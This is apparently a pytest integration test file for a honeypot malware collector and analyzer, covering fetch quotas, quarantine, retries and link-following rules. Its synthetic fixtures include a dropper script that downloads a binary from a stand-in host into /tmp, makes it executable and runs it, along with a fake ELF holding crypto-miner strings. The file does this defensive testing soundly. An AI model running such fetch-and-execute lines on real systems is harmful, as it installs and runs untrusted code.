"""Fetch -> sample -> analysis -> links against a real database and an in-process fake origin.

The fake origin is also the "proxy" (127.0.0.1 only), so the fetches really travel the egress
client and gate code, but nothing leaves the test process. All payloads are synthetic buffers.
Runs as the least-privilege ``suckerpot_collector`` / ``suckerpot_analyzer`` roles.
"""

from __future__ import annotations

import asyncio
import os
import struct
import subprocess
import sys
from collections.abc import AsyncIterator
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest
from sqlalchemy import text
from sqlalchemy.exc import DBAPIError
from sqlalchemy.ext.asyncio import (
    AsyncEngine,
    AsyncSession,
    async_sessionmaker,
    create_async_engine,
)
from suckerpot_analysis import ANALYSIS_VERSION
from suckerpot_db import create_session_factory, database_url_from_env
from suckerpot_db.roles import apply_roles

from collector.analyzer import AnalyzerService
from collector.config import CollectorSettings
from collector.service import CollectorService
from collector.store import Quarantine
from tests.fakes import FakeProxy, Reply, open_gate

pytestmark = pytest.mark.integration

ROOT = Path(__file__).resolve().parents[2]
DB_DIR = Path(os.environ.get("DB_DIR", ROOT / "db"))
RULES = ROOT / "collector" / "rules" / "yara"
COLLECTOR_PW = "collector-test-password-0123456789"
ANALYZER_PW = "analyzer-test-password-0123456789"
ENV: dict[str, str] = {
    **os.environ,
    "POSTGRES_INGEST_USER": os.environ.get("POSTGRES_INGEST_USER", "suckerpot_ingest"),
    "POSTGRES_INGEST_PASSWORD": os.environ.get("POSTGRES_INGEST_PASSWORD", "ingest-test-password"),
    "POSTGRES_API_USER": os.environ.get("POSTGRES_API_USER", "suckerpot_api"),
    "POSTGRES_API_PASSWORD": os.environ.get("POSTGRES_API_PASSWORD", "api-test-password"),
    "POSTGRES_COLLECTOR_PASSWORD": COLLECTOR_PW,
    "POSTGRES_ANALYZER_PASSWORD": ANALYZER_PW,
}
TABLES = (
    "fetch_targets, fetch_attempts, samples, sample_analysis, sample_sources, sample_links, "
    "indicators, enrichment_quota, enrichment_status"
)
NOW = datetime(2026, 5, 1, 12, 0, tzinfo=UTC)
HOST = "http://files.example.test"
SCRIPT = (
    b"#!/bin/sh\ncd /tmp\n"
    b"wget http://dl.example.test/bins/x.arm7 -O x\n"
    b"wget http://198.51.100.9/ignored.sh\n"
    b"chmod 777 x; ./x\n"
)


PAGE = (
    b'<!doctype html><html><head><title>t</title><link rel="stylesheet" '
    b'href="http://dl.example.test/site.css"></head><body>'
    b'<a href="http://dl.example.test/bins/x.arm7">download</a></body></html>'
)


def tiny_elf_with_miner_strings() -> bytes:
    ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + bytes(8)
    header = struct.pack("<HHIQQQIHHHHHH", 2, 62, 1, 0x400000, 64, 0, 0, 64, 56, 0, 64, 0, 0)
    body = b"\x00xmrig donate-level randomx\x00stratum+tcp://8.8.4.4:4444\x00pool 8.8.4.4:4444\x00"
    return ident + header + b"\x00" * 64 + body


class Clock:
    def __init__(self, start: datetime = NOW) -> None:
        self.now = start

    def __call__(self) -> datetime:
        return self.now


def _alembic(*args: str) -> None:
    subprocess.run(
        [sys.executable, "-m", "alembic", *args], cwd=DB_DIR, env=ENV, check=True, timeout=180
    )


def _role_engine(user: str, password: str) -> AsyncEngine:
    url = database_url_from_env({**ENV, "POSTGRES_USER": user, "POSTGRES_PASSWORD": password})
    return create_async_engine(url)


@pytest.fixture
async def owner() -> AsyncIterator[AsyncEngine]:
    _alembic("upgrade", "head")
    engine = create_async_engine(database_url_from_env(ENV))
    # Retry when Postgres picks the reset as a deadlock victim (TRUNCATE ... CASCADE can cross a
    # TimescaleDB background job).
    for attempt in range(5):
        try:
            async with engine.begin() as conn:
                await conn.run_sync(lambda c: apply_roles(c, ENV))
                await conn.execute(text(f"TRUNCATE {TABLES} CASCADE"))
            break
        except DBAPIError as exc:
            if getattr(exc.orig, "sqlstate", None) != "40P01" or attempt == 4:
                raise
            await asyncio.sleep(0.2 * (attempt + 1))
    yield engine
    await engine.dispose()


@pytest.fixture
async def factories(
    owner: AsyncEngine,
) -> AsyncIterator[tuple[async_sessionmaker[AsyncSession], async_sessionmaker[AsyncSession]]]:
    coll = _role_engine(
        os.environ.get("POSTGRES_COLLECTOR_USER", "suckerpot_collector"), COLLECTOR_PW
    )
    ana = _role_engine(os.environ.get("POSTGRES_ANALYZER_USER", "suckerpot_analyzer"), ANALYZER_PW)
    yield create_session_factory(coll), create_session_factory(ana)
    await coll.dispose()
    await ana.dispose()


def settings(tmp_path: Path, **kw: Any) -> CollectorSettings:
    base: dict[str, Any] = {
        "enabled": True,
        "max_bytes": 64 * 1024,
        "timeout_s": 10,
        "connect_timeout_s": 2,
        "host_interval_s": 0.0,
        "quarantine_dir": tmp_path / "q",
        "rules_dir": RULES,
        "heartbeat_path": tmp_path / "hb",
        "analyzer_timeout_s": 30,
        "max_depth": 2,
    }
    base.update(kw)
    return CollectorSettings(**base)


async def add_indicator(owner: AsyncEngine, value: str, *, demo: bool = False) -> int:
    async with owner.begin() as conn:
        row = await conn.execute(
            text(
                "INSERT INTO indicators (type, value, role, host, first_seen, last_seen, demo) "
                "VALUES ('url', :v, 'download_host', 'h', :n, :n, :d) RETURNING id"
            ),
            {"v": value, "n": NOW, "d": demo},
        )
        return int(row.scalar_one())


async def rows(owner: AsyncEngine, sql: str, **params: Any) -> list[Any]:
    async with owner.connect() as conn:
        return list((await conn.execute(text(sql), params)).all())


def handler_for(files: dict[str, Reply]) -> Any:
    def handler(url: str, headers: dict[str, str]) -> Reply:
        return files.get(url, Reply(404, body=b"no"))

    return handler


async def test_fetch_then_analysis_then_links(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    files = {
        f"{HOST}/install.sh": Reply(body=SCRIPT),
        "http://dl.example.test/bins/x.arm7": Reply(body=tiny_elf_with_miner_strings()),
    }
    proxy = FakeProxy(handler_for(files))
    await add_indicator(owner, f"{HOST}/install.sh#frag")
    await add_indicator(owner, "http://dl.example.test/never-demo", demo=True)
    await add_indicator(
        owner,
        "http://10.1.2.3/internal.sh",  # gitleaks:allow
    )
    await add_indicator(owner, "tftp://files.example.test/boot.bin")
    await add_indicator(owner, "http://localhost/x")

    async with proxy.running():
        gate = await open_gate(proxy.url)
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        analyzer = AnalyzerService(s, ana_f, store, clock=clock)

        first = await svc.step()
        assert len(first) == 1  # only the real, public, non-demo URL is fetched
        assert [u for u, _ in proxy.seen] == [f"{HOST}/install.sh"]
        refused = await rows(owner, "SELECT url, status, last_error FROM fetch_targets ORDER BY id")
        by_status = {r.status for r in refused}
        assert {"fetched", "refused", "unsupported"} <= by_status
        assert not any("demo" in r.url for r in refused)

        # The analyzer reads the stored file and writes findings plus the next-stage target.
        assert await analyzer.step() == 1
        sample = (await rows(owner, "SELECT * FROM samples"))[0]
        assert sample.analysis_status == "done"
        assert sample.kind == "script"
        assert sample.stored is True
        links = await rows(
            owner,
            "SELECT kind, value, target_id FROM sample_links WHERE sha256 = :s",
            s=sample.sha256,
        )
        by_value = {r.value: r for r in links}
        nxt = by_value["http://dl.example.test/bins/x.arm7"]
        assert nxt.kind == "next_url"
        assert nxt.target_id is not None
        doc = by_value["http://198.51.100.9/ignored.sh"]
        assert doc.target_id is None  # documentation range: recorded, never queued
        child = (
            await rows(
                owner,
                "SELECT depth, parent_sha256, status FROM fetch_targets WHERE id = :i",
                i=nxt.target_id,
            )
        )[0]
        assert (child.depth, child.parent_sha256, child.status) == (1, sample.sha256, "pending")
        hash_ind = await rows(owner, "SELECT trusted FROM indicators WHERE type = 'hash'")
        assert [r.trusted for r in hash_ind] == [True]

        # Second stage: the collector fetches the next URL; the analyzer finds the C2.
        second = await svc.step()
        assert len(second) == 1
        assert await analyzer.step() == 1
        elf = (await rows(owner, "SELECT * FROM samples WHERE kind = 'elf'"))[0]
        assert elf.family == "xmrig"
        assert elf.analysis_status == "done"
        c2 = await rows(
            owner,
            "SELECT l.kind, l.value, l.indicator_id, i.role FROM sample_links l "
            "LEFT JOIN indicators i ON i.id = l.indicator_id WHERE l.sha256 = :s AND l.kind = 'c2_ip'",
            s=elf.sha256,
        )
        assert c2 and c2[0].value == "8.8.4.4"
        assert c2[0].role == "c2"
        sources = await rows(owner, "SELECT count(*) AS n FROM sample_sources")
        assert sources[0].n == 2
        analysis = await rows(
            owner, "SELECT yara, strings FROM sample_analysis WHERE sha256 = :s", s=elf.sha256
        )
        assert analysis[0].yara and analysis[0].strings

    # files on disk: sha256 name, mode 0400
    stored = [p for p in s.quarantine_dir.rglob("*") if p.is_file()]
    assert len(stored) == 2
    assert {oct(p.stat().st_mode & 0o777) for p in stored} == {"0o400"}
    status = await rows(owner, "SELECT detail FROM enrichment_status WHERE name = 'collector'")
    assert status[0].detail["state"] == "running"


async def test_depth_cap_stops_the_chain(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path, max_depth=0)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    proxy = FakeProxy(handler_for({f"{HOST}/install.sh": Reply(body=SCRIPT)}))
    await add_indicator(owner, f"{HOST}/install.sh")
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        await svc.step()
        await AnalyzerService(s, ana_f, store).step()
    targets = await rows(owner, "SELECT count(*) AS n FROM fetch_targets")
    assert targets[0].n == 1
    link = await rows(owner, "SELECT target_id FROM sample_links WHERE kind = 'next_url'")
    assert link and all(r.target_id is None for r in link)


async def test_links_in_a_web_page_are_not_followed(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    proxy = FakeProxy(handler_for({f"{HOST}/index.html": Reply(body=PAGE)}))
    await add_indicator(owner, f"{HOST}/index.html")
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        analyzer = AnalyzerService(s, ana_f, store)
        assert len(await svc.step()) == 1
        assert await analyzer.step() == 1
        sample = (await rows(owner, "SELECT * FROM samples"))[0]
        assert (sample.kind, sample.severity, sample.family) == ("html", "info", None)
        assert sample.analysis_status == "done"
        assert (await rows(owner, "SELECT count(*) AS n FROM fetch_targets"))[0].n == 1
        assert (await rows(owner, "SELECT count(*) AS n FROM sample_links"))[0].n == 0
        hashes = await rows(owner, "SELECT count(*) AS n FROM indicators WHERE type = 'hash'")
        assert hashes[0].n == 0  # a page is not threat intelligence
        assert [u for u, _ in proxy.seen] == [f"{HOST}/index.html"]

        # A sample analysed by an older version is classified again on its own, with no manual step.
        async with owner.begin() as conn:
            await conn.execute(
                text("UPDATE samples SET kind = 'text', severity = 'notice', analysis_version = 1")
            )
        assert await analyzer.step() == 1
        again = (await rows(owner, "SELECT kind, severity, analysis_version FROM samples"))[0]
        assert (again.kind, again.severity, again.analysis_version) == (
            "html",
            "info",
            ANALYSIS_VERSION,
        )
        assert await analyzer.step() == 0


async def test_a_target_queued_from_a_web_page_is_not_fetched(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    page, script = "a1" * 32, "b2" * 32
    async with owner.begin() as conn:
        for sha, kind in ((page, "html"), (script, "script")):
            await conn.execute(
                text(
                    "INSERT INTO samples (sha256, sha1, md5, size, kind, first_seen, last_seen) "
                    "VALUES (:sha, :sha1, :md5, 10, :kind, :n, :n)"
                ),
                {"sha": sha, "sha1": sha[:40], "md5": sha[:32], "kind": kind, "n": NOW},
            )
    typed = await add_indicator(owner, f"{HOST}/typed.sh")  # an attacker also typed this one
    queued = [
        (f"{HOST}/page-link.css", page, None),  # found inside a web page
        (f"{HOST}/typed.sh", page, typed),  # found inside a web page, but also typed
        (f"{HOST}/script-link.sh", script, None),  # found inside a script
    ]
    async with owner.begin() as conn:
        for url, parent, indicator in queued:
            await conn.execute(
                text(
                    "INSERT INTO fetch_targets (url, scheme, host, indicator_id, parent_sha256, "
                    "depth, status, first_seen, next_attempt_at) VALUES "
                    "(:u, 'http', 'files.example.test', :i, :p, 1, 'pending', :n, :n)"
                ),
                {"u": url, "i": indicator, "p": parent, "n": NOW},
            )
    replies = {
        f"{HOST}/typed.sh": Reply(body=b"#!/bin/sh\necho typed\n"),
        f"{HOST}/script-link.sh": Reply(body=b"#!/bin/sh\necho linked\n"),
    }
    proxy = FakeProxy(handler_for(replies))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        assert len(await svc.step()) == 3
    assert sorted(u for u, _ in proxy.seen) == sorted(replies)  # the page's link never left
    by_url = {
        r.url: r
        for r in await rows(owner, "SELECT url, status, last_error, attempts FROM fetch_targets")
    }
    skipped = by_url[f"{HOST}/page-link.css"]
    assert (skipped.status, skipped.last_error) == ("refused", "web_parent")
    assert by_url[f"{HOST}/typed.sh"].status == "fetched"
    assert by_url[f"{HOST}/script-link.sh"].status == "fetched"
    quota = await rows(owner, "SELECT used FROM enrichment_quota")
    assert [r.used for r in quota] == [2]  # the skipped target spent nothing


async def test_closed_gate_spends_nothing(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    proxy = FakeProxy(handler_for({f"{HOST}/a.sh": Reply(body=SCRIPT)}))
    await add_indicator(owner, f"{HOST}/a.sh")
    async with proxy.running():
        gate = await open_gate(proxy.url, open_=False)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        assert await svc.step() == []
    assert proxy.seen == []
    assert (await rows(owner, "SELECT count(*) AS n FROM fetch_attempts"))[0].n == 0
    assert (await rows(owner, "SELECT count(*) AS n FROM enrichment_quota"))[0].n == 0
    target = (await rows(owner, "SELECT status, attempts FROM fetch_targets"))[0]
    assert (target.status, target.attempts) == ("pending", 0)
    detail = (await rows(owner, "SELECT detail FROM enrichment_status WHERE name = 'collector'"))[
        0
    ].detail
    assert detail["state"] == "waiting"
    assert detail["reason"] == "not_checked"


async def test_gate_closing_during_a_fetch_refunds_the_quota(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    await add_indicator(owner, f"{HOST}/a.sh")
    proxy = FakeProxy(handler_for({}))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        await svc.sync_targets()
        gate._status = type(gate._status)(False, "tunnel_down", None, gate._status.checked_at)
        targets = await svc._due(5)
        assert await svc._handle(targets[0]) is None
    assert proxy.seen == []
    used = await rows(owner, "SELECT used FROM enrichment_quota WHERE provider = 'collector'")
    assert [r.used for r in used] == [0]
    assert (await rows(owner, "SELECT count(*) AS n FROM fetch_attempts"))[0].n == 0


async def test_daily_and_hourly_quotas(owner: AsyncEngine, factories: Any, tmp_path: Path) -> None:
    coll_f, _ = factories
    store_dir = tmp_path / "q"
    for i in range(5):
        await add_indicator(owner, f"{HOST}/f{i}.sh")
    files = {f"{HOST}/f{i}.sh": Reply(body=SCRIPT + str(i).encode()) for i in range(5)}
    proxy = FakeProxy(handler_for(files))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        s = settings(tmp_path, daily_quota=3, hourly_quota=100, quarantine_dir=store_dir)
        store = Quarantine(store_dir)
        store.prepare()
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        done = await svc.step()
        assert len(done) == 3
        assert await svc.step() == []  # the daily quota is spent
        used = await rows(owner, "SELECT used FROM enrichment_quota WHERE provider = 'collector'")
        assert [r.used for r in used] == [3]
        clock.now += timedelta(days=1)
        assert len(await svc.step()) == 2  # a new UTC day, the rest go through

        # hourly: attempts in the last hour count, older ones do not
        await add_indicator(owner, f"{HOST}/g1.sh")
        await add_indicator(owner, f"{HOST}/g2.sh")
        files[f"{HOST}/g1.sh"] = Reply(body=b"g1 data")
        files[f"{HOST}/g2.sh"] = Reply(body=b"g2 data")
        s2 = settings(tmp_path, daily_quota=1000, hourly_quota=2, quarantine_dir=store_dir)
        svc2 = CollectorService(s2, coll_f, store, gate, clock=clock)
        assert await svc2.step() == []  # two attempts in the last hour already
        clock.now += timedelta(hours=2)
        assert len(await svc2.step()) == 2


async def test_retry_schedule_then_failed(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    await add_indicator(owner, f"{HOST}/flaky.sh")
    proxy = FakeProxy(lambda u, h: Reply(503, body=b"busy"))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        waits = []
        for _ in range(3):
            assert [o for _, o in await svc.step()] == ["http_5xx"]
            t = (await rows(owner, "SELECT status, next_attempt_at, attempts FROM fetch_targets"))[
                0
            ]
            assert t.status == "pending"
            waits.append(t.next_attempt_at - clock.now)
            assert await svc.step() == []  # not due yet
            clock.now = t.next_attempt_at
        assert waits == [timedelta(minutes=15), timedelta(hours=1), timedelta(hours=6)]
        assert [o for _, o in await svc.step()] == ["http_5xx"]
    t = (
        await rows(owner, "SELECT status, next_attempt_at, attempts, last_error FROM fetch_targets")
    )[0]
    assert (t.status, t.next_attempt_at, t.attempts, t.last_error) == (
        "failed",
        None,
        4,
        "http_5xx",
    )
    attempts = await rows(owner, "SELECT outcome, http_status FROM fetch_attempts")
    assert [(r.outcome, r.http_status) for r in attempts] == [("http_5xx", 503)] * 4


async def test_final_outcomes(owner: AsyncEngine, factories: Any, tmp_path: Path) -> None:
    coll_f, _ = factories
    s = settings(tmp_path, max_bytes=2048)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    files = {
        f"{HOST}/gone": Reply(404),
        f"{HOST}/big": Reply(body=b"Z" * 10_000, chunked=True),
        f"{HOST}/loop": Reply(302, headers={"Location": "http://127.0.0.1:1/x"}),
        f"{HOST}/ok": Reply(body=b"fine"),
    }
    for name in files:
        await add_indicator(owner, name)
    proxy = FakeProxy(handler_for(files))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        await svc.step()
    got = {
        r.url: (r.status, r.last_error)
        for r in await rows(owner, "SELECT url, status, last_error FROM fetch_targets")
    }
    assert got[f"{HOST}/gone"][0] == "gone"
    assert got[f"{HOST}/big"][0] == "too_large"
    assert got[f"{HOST}/loop"] == ("refused", "ip_forbidden")
    assert got[f"{HOST}/ok"][0] == "fetched"
    assert [u for u, _ in proxy.seen if "127.0.0.1" in u] == []  # the private hop was never sent
    # no new attempt for final states
    assert await svc.step() == []


async def test_quarantine_full_stops_fetching_but_keeps_recording(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path, quarantine_max_mb=1)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    async with owner.begin() as conn:
        await conn.execute(
            text(
                "INSERT INTO samples (sha256, sha1, md5, size, first_seen, last_seen) "
                "VALUES (:s, 'a', 'b', :n, :now, :now)"
            ),
            {"s": "c" * 64, "n": 2 * 1024 * 1024, "now": NOW},
        )
    await add_indicator(owner, f"{HOST}/new.sh")
    proxy = FakeProxy(handler_for({f"{HOST}/new.sh": Reply(body=SCRIPT)}))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        assert await svc.step() == []
    assert proxy.seen == []
    assert (await rows(owner, "SELECT status FROM fetch_targets"))[0].status == "pending"
    detail = (await rows(owner, "SELECT detail FROM enrichment_status WHERE name = 'collector'"))[
        0
    ].detail
    assert detail["state"] == "quarantine_full"
    assert detail["quarantine_full"] is True


async def test_disabled_collector_is_idle(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path, enabled=False)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    await add_indicator(owner, f"{HOST}/a.sh")
    proxy = FakeProxy(handler_for({}))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        assert await CollectorService(s, coll_f, store, gate, clock=Clock()).step() == []
        assert await AnalyzerService(s, ana_f, store).step() == 0
    assert proxy.seen == []
    assert (await rows(owner, "SELECT count(*) AS n FROM fetch_targets"))[0].n == 0


async def test_refetch_only_when_seen_again(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path, refetch_hours=24)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    ind = await add_indicator(owner, f"{HOST}/rot.sh")
    bodies = [b"first version", b"second version"]
    proxy = FakeProxy(lambda u, h: Reply(body=bodies.pop(0)))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        assert len(await svc.step()) == 1
        clock.now += timedelta(days=2)
        assert await svc.step() == []  # not seen again: no refetch
        async with owner.begin() as conn:
            await conn.execute(
                text("UPDATE indicators SET last_seen = :n WHERE id = :i"),
                {"n": clock.now, "i": ind},
            )
        assert len(await svc.step()) == 1
    samples = await rows(owner, "SELECT count(*) AS n FROM samples")
    assert samples[0].n == 2  # a new hash behind the same URL is a new sample
    assert (await rows(owner, "SELECT count(*) AS n FROM sample_sources"))[0].n == 2
    assert (await rows(owner, "SELECT fetches FROM fetch_targets"))[0].fetches == 2


async def test_retention_removes_files_but_keeps_rows(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path, retention_days=90)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    await add_indicator(owner, f"{HOST}/old.sh")
    proxy = FakeProxy(handler_for({f"{HOST}/old.sh": Reply(body=SCRIPT)}))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        await svc.step()
        assert await svc.retention_pass() == 0
        clock.now += timedelta(days=91)
        assert await svc.retention_pass() == 1
    assert [p for p in s.quarantine_dir.rglob("*") if p.is_file()] == []
    sample = (await rows(owner, "SELECT stored FROM samples"))[0]
    assert sample.stored is False
    assert (await rows(owner, "SELECT count(*) AS n FROM fetch_attempts"))[0].n == 0


async def test_analyzer_records_a_missing_file_and_a_tampered_one(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    _, ana_f = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    async with owner.begin() as conn:
        for sha in ("d" * 64, "e" * 64):
            await conn.execute(
                text(
                    "INSERT INTO samples (sha256, sha1, md5, size, first_seen, last_seen) "
                    "VALUES (:s, 'a', 'b', 1, :n, :n)"
                ),
                {"s": sha, "n": NOW},
            )
    # a file whose content does not match its name
    path = store.path_for("e" * 64)
    path.parent.mkdir(parents=True, mode=0o700)
    path.write_bytes(b"not the right content")
    svc = AnalyzerService(s, ana_f, store, clock=Clock())
    assert await svc.step() == 2
    got = {
        r.sha256: (r.analysis_status, r.errors)
        for r in await rows(
            owner,
            "SELECT s.sha256, s.analysis_status, a.errors FROM samples s "
            "JOIN sample_analysis a USING (sha256)",
        )
    }
    assert got["d" * 64] == ("failed", ["file_missing"])
    assert got["e" * 64] == ("failed", ["hash_mismatch"])
    assert await svc.step() == 0  # failed samples are not retried forever


async def test_concurrent_fetches_cannot_overshoot_the_quarantine_cap(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path, quarantine_max_mb=1, max_bytes=800 * 1024, concurrency=2)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    files = {}
    for i in range(2):
        await add_indicator(owner, f"{HOST}/c{i}.bin")
        files[f"{HOST}/c{i}.bin"] = Reply(body=bytes([65 + i]) * (700 * 1024), chunked=True)
    proxy = FakeProxy(handler_for(files))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        outcomes = sorted(o for _, o in await svc.step())
    assert outcomes == ["ok", "quarantine_full"]
    total = (await rows(owner, "SELECT COALESCE(sum(size), 0) AS n FROM samples"))[0].n
    assert total <= 1024 * 1024
    assert svc._reserved == 0


async def add_verify_target(owner: AsyncEngine, url: str) -> int:
    """A URL leased from the hub for verification (M32): depth 0, origin network_verify."""
    async with owner.begin() as conn:
        row = await conn.execute(
            text(
                "INSERT INTO fetch_targets (url, scheme, host, depth, status, first_seen, "
                "next_attempt_at, origin) VALUES (:u, 'http', 'files.example.test', 0, "
                "'pending', :n, :n, 'network_verify') RETURNING id"
            ),
            {"u": url, "n": NOW},
        )
        return int(row.scalar_one())


async def test_verification_fetch_never_follows_links_or_creates_indicators(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path)  # max_depth=2: depth alone would allow a child target
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    proxy = FakeProxy(handler_for({f"{HOST}/v.sh": Reply(body=SCRIPT)}))
    await add_verify_target(owner, f"{HOST}/v.sh")
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        assert len(await svc.step()) == 1  # fetched with the shared quota and every guard
        assert await AnalyzerService(s, ana_f, store, clock=Clock()).step() == 1
    assert [u for u, _ in proxy.seen] == [f"{HOST}/v.sh"]
    assert (await rows(owner, "SELECT count(*) AS n FROM fetch_targets"))[0].n == 1
    links = await rows(owner, "SELECT kind, target_id, indicator_id FROM sample_links")
    assert {r.kind for r in links} >= {"next_url"}
    assert all(r.target_id is None and r.indicator_id is None for r in links)
    assert (await rows(owner, "SELECT count(*) AS n FROM indicators"))[0].n == 0
    spent = await rows(
        owner, "SELECT count(*) AS n FROM enrichment_quota WHERE provider = 'collector'"
    )
    assert spent[0].n >= 1  # the shared daily quota was used


async def test_a_local_sighting_keeps_the_normal_analysis(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    proxy = FakeProxy(handler_for({f"{HOST}/v.sh": Reply(body=SCRIPT)}))
    await add_verify_target(owner, f"{HOST}/v.sh")
    await add_indicator(owner, f"{HOST}/v.sh")  # the node's own sighting of the same URL
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        await svc.sync_targets()
        origin = (await rows(owner, "SELECT origin FROM fetch_targets"))[0].origin
        assert origin == "local"  # local interest wins: children and indicators are allowed
        await svc.step()
        await AnalyzerService(s, ana_f, store, clock=Clock()).step()
    hashes = await rows(owner, "SELECT count(*) AS n FROM indicators WHERE type = 'hash'")
    assert hashes[0].n == 1


async def test_verify_rows_are_refused_when_the_role_is_off(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path, verify_enabled=False)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    proxy = FakeProxy(
        handler_for({f"{HOST}/v.sh": Reply(body=SCRIPT), f"{HOST}/l.sh": Reply(body=SCRIPT)})
    )
    await add_verify_target(owner, f"{HOST}/v.sh")
    await add_indicator(owner, f"{HOST}/l.sh")
    async with proxy.running():
        gate = await open_gate(proxy.url)
        await CollectorService(s, coll_f, store, gate, clock=Clock()).step()
    assert [u for u, _ in proxy.seen] == [f"{HOST}/l.sh"]  # the local target still runs
    row = (
        await rows(owner, "SELECT status, last_error FROM fetch_targets WHERE origin <> 'local'")
    )[0]
    assert (row.status, row.last_error) == ("refused", "verify_disabled")
